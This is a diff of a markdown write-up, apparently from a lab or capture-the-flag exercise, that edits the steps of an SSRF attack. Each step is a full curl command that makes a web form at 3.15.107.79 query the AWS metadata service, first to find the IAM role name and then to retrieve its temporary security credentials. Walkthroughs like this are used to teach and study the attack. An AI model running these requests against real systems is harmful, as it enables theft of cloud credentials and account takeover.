@@ -20,11 +20,11 @@ Tinkered with https://inyunqef0e.execute-api.us-east-2.amazonaws.com/api/private
 ## Credential Gathering
 **These next steps could be done using the form, but I found myself using curl instead.**   
 **Fun Note:** AWS uses 169.254.169.254 as the metadata-IP where the metadata service can be accessed via http://169.254.169.254/latest/meta-data/ from the E2 instance.
-1) Used ```curl -X POST http://3.15.107.79/ -d "url=https://inyunqef0e.execute-api.us-east-2.amazonaws.com/api/status"``` to test curl and see what would happen to the output. The output appeared to be a huge chunk instead of nicely spread out. This led me to further investigate SSRF on http://3.15.107.79/
+1) Used ```curl -X POST http://3.15.107.79/ -d "url=https://inyunqef0e.execute-api.us-east-2.amazonaws.com/api/status"``` The output appeared to be a huge chunk instead of being nicely spread out. This led me to further investigate SSRF on http://3.15.107.79/
    
-2) Next tried ```curl -X POST http://3.15.107.79/ -d "url=http://169.254.169.254/latest/meta-data/"``` revealing the **iam/** metadata key. The goal was to extract the temporary security credentials from ```iam/security-credentials/role-name```.   
+2) ```curl -X POST http://3.15.107.79/ -d "url=http://169.254.169.254/latest/meta-data/"``` revealed the **iam/** metadata key. The goal was to extract the temporary security credentials from ```iam/security-credentials/role-name```.   
 ![I am](iam_exposed.png)   
-3) Used ```curl -X POST http://3.15.107.79/ -d "url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"``` to get the role-name which was "APICallerRole"   
+3) ```curl -X POST http://3.15.107.79/ -d "url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"``` to get the role-name which was "APICallerRole"   
 ![Role Name](Role_Name.png)
 4) To get the temp security credentials used ```curl -X POST http://3.15.107.79/ -d "url=http://169.254.169.254/latest/meta-data/iam/security-credentials/APICallerRole"```   
 ![Temp Sec Credentials](Temp_Sec_Credentials.png)
